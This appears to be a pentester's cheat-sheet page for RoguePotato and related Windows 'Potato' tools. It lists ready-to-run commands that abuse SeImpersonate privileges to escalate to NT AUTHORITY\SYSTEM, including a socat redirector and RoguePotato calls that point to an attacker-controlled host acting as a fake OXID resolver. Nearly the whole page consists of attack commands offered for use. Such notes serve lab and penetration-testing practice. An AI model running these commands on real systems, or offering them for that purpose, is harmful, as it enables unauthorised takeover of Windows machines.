---
title: "RoguePotato.exe"
sidebarTitle: "RoguePotato.exe"
description: "Commands and examples collected from your RoguePotato.exe notes."
keywords: ["RoguePotato.exe"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/roguepotato.md. Edit the Markdown source, then run scripts/sync_site.py. */}

[Search this tool’s saved examples](/commands/notebook?tool=roguepotato) · [All tools](/index)

## A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)

**Notebook example**

```cmd
:: PrintSpoofer (uses the print spooler / RPC)
.\PrintSpoofer64.exe -i -c cmd.exe
:: GodPotato (DCOM; very reliable on Server 2016–2022) — pick the .NET version present
.\GodPotato-NET4.exe -cmd "cmd /c whoami"           :: -> nt authority\system
:: alternatives if those are blocked:
.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
.\RoguePotato.exe -r <KALI_IP> -e "cmd.exe" -l 9999
.\EfsPotato.exe "cmd /c whoami"
```

Saved as written; may include lab values or terminal output.

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

1 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="Rogue Potato (Fake OXID Resolver)">

### Rogue Potato (Fake OXID Resolver)

**Windows Privilege Escalation: Full Checklist**

```powershell
# Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999

# RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. 
# Use this if you have fw restrictions.
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"

# RoguePotato all in one with RogueOxidResolver running locally on port 9999
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999

#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
```

</Accordion>

</AccordionGroup>
